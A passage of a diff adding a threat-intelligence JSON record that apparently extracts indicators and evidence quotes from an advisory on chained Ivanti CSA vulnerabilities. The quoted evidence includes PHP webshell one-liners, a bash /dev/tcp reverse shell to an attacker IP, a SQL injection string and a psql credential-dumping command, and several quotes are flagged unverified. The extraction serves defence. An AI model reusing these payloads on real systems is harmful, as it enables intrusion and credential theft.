+  },
+  {
+   "id": "indicator-66",
+   "type": "ip",
+   "value": "216.73.162[.]56",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-169"
+   ]
+  },
+  {
+   "id": "indicator-67",
+   "type": "ip",
+   "value": "104.28.240[.]123",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-170"
+   ]
+  },
+  {
+   "id": "indicator-68",
+   "type": "ip",
+   "value": "163.5.171[.]49",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-171",
+    "evidence-172"
+   ]
+  },
+  {
+   "id": "indicator-69",
+   "type": "ip",
+   "value": "89.187.178[.]179",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-173"
+   ]
+  },
+  {
+   "id": "indicator-70",
+   "type": "ip",
+   "value": "203.160.86[.]69",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-174"
+   ]
+  },
+  {
+   "id": "indicator-71",
+   "type": "ip",
+   "value": "185.220.69[.]83",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-175"
+   ]
+  },
+  {
+   "id": "indicator-72",
+   "type": "ip",
+   "value": "185.199.103[.]196",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-176"
+   ]
+  },
+  {
+   "id": "indicator-73",
+   "type": "ip",
+   "value": "188.172.229[.]15",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-177"
+   ]
+  },
+  {
+   "id": "indicator-74",
+   "type": "ip",
+   "value": "155.138.215[.]144",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-178"
+   ]
+  },
+  {
+   "id": "indicator-75",
+   "type": "ip",
+   "value": "185.40.4[.]38",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-179"
+   ]
+  },
+  {
+   "id": "indicator-76",
+   "type": "ip",
+   "value": "216.131[.]75.53",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-180"
+   ]
+  },
+  {
+   "id": "indicator-77",
+   "type": "ip",
+   "value": "185.40.4[.]95",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-181"
+   ]
+  },
+  {
+   "id": "indicator-78",
+   "type": "cve",
+   "value": "CVE-2024-9381",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-182"
+   ]
+  },
+  {
+   "id": "indicator-79",
+   "type": "domain",
+   "value": "gggg.oyr2ohrm.eyes.sh",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-183"
+   ]
+  }
+ ],
+ "commands": [],
+ "evidence": [
+  {
+   "id": "evidence-1",
+   "quote": "the threat actors first sent a GET request to datetime.php to acquire session and cross-site request forgery (CSRF) tokens using GET /client/index.php%3F.php/gsb/datetime[.]php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "the threat actors first sent a GET request to datetime.php to acquire session and cross site request forgery (CSRF) tokens using GET /client/index.php%3F.php/gs"
+  },
+  {
+   "id": "evidence-2",
+   "quote": "They followed this in quick succession with a POST request to the same endpoint, using the TIMEZONE input field to manipulate the setSystemTimeZone function and execute code. In some confirmed compromises, the actors used this method to run base64-encoded Python scripts that harvested encrypted admin credentials from the database.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "They followed this in quick succession with a POST request to the same endpoint, using the TIMEZONE input field to manipulate the setSystemTimeZone function and"
+  },
+  {
+   "id": "evidence-3",
+   "quote": "In some cases, the threat actors exfiltrated the encrypted admin credentials then decrypted them offline.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In some cases, the threat actors exfiltrated the encrypted admin credentials then decrypted them offline."
+  },
+  {
+   "id": "evidence-4",
+   "quote": "In other cases, the threat actors leveraged an executable matching the regular expression php\\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltration—this tool was unrecoverable.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In other cases, the threat actors leveraged an executable matching the regular expression php\\w{6} located in the /tmp directory to decrypt the credentials prio"
+  },
+  {
+   "id": "evidence-5",
+   "quote": "After obtaining credentials, the actors logged in and exploited CVE-2024-9380 to execute commands from a higher privileged account.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "After obtaining credentials, the actors logged in and exploited CVE 2024 9380 to execute commands from a higher privileged account."
+  },
+  {
+   "id": "evidence-6",
+   "quote": "The actors successfully sent a GET request to /gsb/reports[.]php.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The actors successfully sent a GET request to /gsb/reports[.]php."
+  },
+  {
+   "id": "evidence-7",
+   "quote": "They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence."
+  },
+  {
+   "id": "evidence-8",
+   "quote": "In one confirmed compromise, the threat actors tried to create webshells using two different paths: echo \"<?php system(@\\$_REQUEST['a']);\">/opt/ivanti/csa/broker/webroot/client/help.php and echo \"<?php system('/bin/sudo '. @\\$_REQUEST['a']);\" > /opt/landesk/broker/webroot/gsb/help.php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "In one confirmed compromise, the threat actors tried to create webshells using two different paths: "
+  },
+  {
+   "id": "evidence-9",
+   "quote": "In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) channel: bash -i >&/dev/tcp/107.173.89[.]16/8000 0>&1.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) c"
+  },
+  {
+   "id": "evidence-10",
+   "quote": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation. See Appendix B for the list of sudo commands used.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation. See Appe"
+  },
+  {
+   "id": "evidence-11",
+   "quote": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain. It is suspected that the threat actors gained access into a Jenkins server running a vulnerable, outdated version.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain. It is suspected"
+  },
+  {
+   "id": "evidence-12",
+   "quote": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities."
+  },
+  {
+   "id": "evidence-13",
+   "quote": "The threat actors then attempted to log into the Virtual Private Network (VPN) server but were unsuccessful.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The threat actors then attempted to log into the Virtual Private Network (VPN) server but were unsuccessful."
+  },
+  {
+   "id": "evidence-14",
+   "quote": "In one confirmed compromise, the actors used a similar exploit chain, exploiting CVE-2024-8963 in conjunction with CVE-2024-9379, using GET /client/index.php%3f.php/gsb/broker.php for initial access.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In one confirmed compromise, the actors used a similar exploit chain, exploiting CVE 2024 8963 in conjunction with CVE 2024 9379, using GET /client/index.php%3f"
+  },
+  {
+   "id": "evidence-15",
+   "quote": "After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell to gain persistent access. They executed GET and POST requests in quick succession to /client/index.php%3F.php/gsb/broker.php.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "After the threat actors gained initial access, they attempted to exploit CVE 2024 9379 to create a webshell to gain persistent access. They executed GET and POS"
+  },
+  {
+   "id": "evidence-16",
+   "quote": "In the POST body, threat actors entered the following string in the lockout attempts input box: LOCKOUTATTEMPTS = 1 ;INSERT INTO user_info(username, accessed, attempts) VALUES ('''echo -n TnNhV1Z1ZEM5b1pXeHdMbk>>/.k''', NOW(), 10). The first portion of the command (LOCKOUTATTEMPTS=1) fit the format of the application and was properly handled by the application. However, the second portion of the command, a SQL injection, was not properly handled by the application. Regardless, the application processed both commands, allowing the threat actors to insert a user into the user_info table.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.9,
+   "matched_text": "In the POST body, threat actors entered the following string in the lockout attempts input box: LOCKOUTATTEMPTS = 1 ;INSERT INTO user_info(username, accessed, a"
+  },
+  {
+   "id": "evidence-17",
+   "quote": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user. The authoring agencies believe the threat actors knew this login would fail but were attempting to coerce the application into handling the bash code improperly. In this attempt, the application did not evaluate the validity of the login, but instead ran echo -n TnNhV1Z1ZEM5b1pXeHdMbk>>./k as if it were code. The threat actors repeated the process of echo commands until they built a valid web shell. However, there were no observations that the threat actors were successful.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user. The authoring agencies believe the threat ac"
+  },
+  {
+   "id": "evidence-18",
+   "quote": "They followed this in quick succession with a POST request to the same endpoint, using the TIMEZONE input field to manipulate the setSystemTimeZone function and execute code.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "They followed this in quick succession with a POST request to the same endpoint, using the TIMEZONE input field to manipulate the setSystemTimeZone function and"
+  },
+  {
+   "id": "evidence-19",
+   "quote": "In some confirmed compromises, the actors used this method to run base64-encoded Python scripts that harvested encrypted admin credentials from the database.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In some confirmed compromises, the actors used this method to run base64 encoded Python scripts that harvested encrypted admin credentials from the database."
+  },
+  {
+   "id": "evidence-20",
+   "quote": "They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence."
+  },
+  {
+   "id": "evidence-21",
+   "quote": "In one confirmed compromise, the threat actors tried to create webshells using two different paths:",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In one confirmed compromise, the threat actors tried to create webshells using two different paths:"
+  },
+  {
+   "id": "evidence-22",
+   "quote": "In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) channel:",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In the same compromise, the actors used the exploit to execute the following script to create a reverse Transmission Control Protocol command and control (C2) c"
+  },
+  {
+   "id": "evidence-23",
+   "quote": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation."
+  },
+  {
+   "id": "evidence-24",
+   "quote": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain."
+  },
+  {
+   "id": "evidence-25",
+   "quote": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities."
+  },
+  {
+   "id": "evidence-26",
+   "quote": "After the threat actors gained initial access, they attempted to exploit CVE-2024-9379 to create a webshell to gain persistent access.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "After the threat actors gained initial access, they attempted to exploit CVE 2024 9379 to create a webshell to gain persistent access."
+  },
+  {
+   "id": "evidence-27",
+   "quote": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user."
+  },
+  {
+   "id": "evidence-28",
+   "quote": "All four vulnerabilities affect Ivanti CSA version 4.6x versions before 519, and two of the vulnerabilities (CVE-2024-9379 and CVE-2024-9380) affect CSA versions 5.0.1 and below",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "All four vulnerabilities affect Ivanti CSA version 4.6x versions before 519, and two of the vulnerabilities (CVE 2024 9379 and CVE 2024 9380) affect CSA version"
+  },
+  {
+   "id": "evidence-29",
+   "quote": "Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "1"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Applications"
+  },
+  {
+   "id": "evidence-30",
+   "quote": "Threat actors chained the listed vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant webshells on victim networks.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "hreat actors chained the listed vulnerabilities to gain initial access, conduct remote code execution (RCE), obtain credentials, and implant webshells on victim"
+  },
+  {
+   "id": "evidence-31",
+   "quote": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain. It is suspected that the threat actors gained access into a Jenkins server running a vulnerable, outdated version",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In one case, there was evidence of lateral movement after the threat actors gained access and established a foothold through this exploit chain. It is suspected"
+  },
+  {
+   "id": "evidence-32",
+   "quote": "Threat actors exfiltrated encrypted admin credentials from the victim's database.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:a3"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-33",
+   "quote": "os.system('''export PGPASSWORD={};echo \"update user_info set organization='{}' where username='admin'\"|psql -d brokerdb -U gsbadmin'''.format(p, msg))",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "189"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "os.system('''export PGPASSWORD={};echo \"update user_info set organization='{}' where username='admin'\"|psql d brokerdb U gsbadmin'''.format(p, msg))"
+  },
+  {
+   "id": "evidence-34",
+   "quote": "export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username='admin' | psql -d brokerdb -U gsbadmin -h localhost",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "189"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "export PGPASSWORD={};echo SELECT passwd FROM user_info WHERE username="
+  },
+  {
+   "id": "evidence-35",
+   "quote": "The threat actors first sent a GET request to datetime.php to acquire session and cross-site request forgery (CSRF) tokens using GET /client/index.php%3F.php/gsb/datetime.php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "he threat actors first sent a GET request to datetime.php to acquire session and cross site request forgery (CSRF) tokens using GET /client/index.php%3F.php/gsb"
+  },
+  {
+   "id": "evidence-36",
+   "quote": "The actors successfully sent a GET request to /gsb/reports.php. They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "php. They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence."
+  },
+  {
+   "id": "evidence-37",
+   "quote": "In one confirmed compromise, the threat actors tried to create webshells using two different paths: echo \"<?php system(@\\$_REQUEST['a']);\">/opt/ivanti/csa/broker/webroot/client/help.php and echo \"<?php system('/bin/sudo '. @\\$_REQUEST['a']);\" > /opt/landesk/broker/webroot/gsb/help.php.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:a8"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-38",
+   "quote": "Logs on the Jenkins machine showed that a command in the bash history contained credentials to the postgres server.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Logs on the Jenkins machine showed that a command in the bash history contained credentials to the postgres server."
+  },
+  {
+   "id": "evidence-39",
+   "quote": "the threat actors leveraged an executable matching the regular expression php\\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltration—this tool was unrecoverable.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "the threat actors leveraged an executable matching the regular expression php\\w{6} located in the /tmp directory to decrypt the credentials prior to exfiltratio"
+  },
+  {
+   "id": "evidence-40",
+   "quote": "the actors used this method to run base64-encoded Python scripts that harvested encrypted admin credentials from the database",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "the actors used this method to run base64 encoded Python scripts that harvested encrypted admin credentials from the database"
+  },
+  {
+   "id": "evidence-41",
+   "quote": "They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "They immediately followed this with a POST request using the TW_ID input field to execute code to implant webshells for persistence"
+  },
+  {
+   "id": "evidence-42",
+   "quote": "The actors used the exploit to execute the script: bash -i >&/dev/tcp/107.173.89[.]16/8000 0>&1 to create a reverse TCP command and control channel.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:a9"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-43",
+   "quote": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The threat actors used sudo commands to disable the vulnerability in DateTimeTab.php, modify and remove webshells, and remove evidence of exploitation"
+  },
+  {
+   "id": "evidence-44",
+   "quote": "See Table 14 for a list of known sudo commands executed by the threat actors.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "229"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "See Table 14 for a list of known sudo commands executed by the threat actors."
+  },
+  {
+   "id": "evidence-45",
+   "quote": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "12"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Prior to moving laterally, the actors likely performed discovery on the CSA device using Obelisk and GoGo to scan for vulnerabilities"
+  },
+  {
+   "id": "evidence-46",
+   "quote": "Threat actors executed a SQL injection via the lockout attempts input box to insert a user into the user_info table.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:a15"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-47",
+   "quote": "After inserting valid bash code as a user in the user_info table, the threat actors attempted to login as the user to coerce the application into handling the bash code improperly",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "unresolved:a16"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": ""
+  },
+  {
+   "id": "evidence-48",
+   "quote": "CVE-2025-0282",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2025 0282"
+  },
+  {
+   "id": "evidence-49",
+   "quote": "CVE-2025-\n       0282",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2025 0282"
+  },
+  {
+   "id": "evidence-50",
+   "quote": "CVE-2025-0283",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2025 0283"
+  },
+  {
+   "id": "evidence-51",
+   "quote": "CVE-2024-8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-52",
+   "quote": "CVE-2024-8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-53",
+   "quote": "CVE-2024-\n        8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-54",
+   "quote": "CVE-2024-8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-55",
+   "quote": "CVE-2024-8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-56",
+   "quote": "CVE-2024-8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-57",
+   "quote": "CVE-2024-8963",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "185"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8963"
+  },
+  {
+   "id": "evidence-58",
+   "quote": "CVE-2024-8190",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8190"
+  },
+  {
+   "id": "evidence-59",
+   "quote": "CVE-2024-8190",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8190"
+  },
+  {
+   "id": "evidence-60",
+   "quote": "CVE-2024-8190",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8190"
+  },
+  {
+   "id": "evidence-61",
+   "quote": "CVE-2024-8190",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "185"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 8190"
+  },
+  {
+   "id": "evidence-62",
+   "quote": "CVE-2024-9380",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9380"
+  },
+  {
+   "id": "evidence-63",
+   "quote": "CVE-2024-9380",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9380"
+  },
+  {
+   "id": "evidence-64",
+   "quote": "CVE-2024-9380",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9380"
+  },
+  {
+   "id": "evidence-65",
+   "quote": "CVE-2024-9380",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9380"
+  },
+  {
+   "id": "evidence-66",
+   "quote": "CVE-2024-9380",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9380"
+  },
+  {
+   "id": "evidence-67",
+   "quote": "CVE-2024-9380",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "185"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9380"
+  },
+  {
+   "id": "evidence-68",
+   "quote": "CVE-2024-9379",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9379"
+  },
+  {
+   "id": "evidence-69",
+   "quote": "CVE-2024-9379",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9379"
+  },
+  {
+   "id": "evidence-70",
+   "quote": "CVE-2024-9379",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "13"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9379"
+  },
+  {
+   "id": "evidence-71",
+   "quote": "CVE-2024-9379",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "19"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9379"
+  },
+  {
+   "id": "evidence-72",
+   "quote": "CVE-2024-9379",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "185"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2024 9379"
+  },
+  {
+   "id": "evidence-73",
+   "quote": "datetime[.]php",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "datetime[.]php"
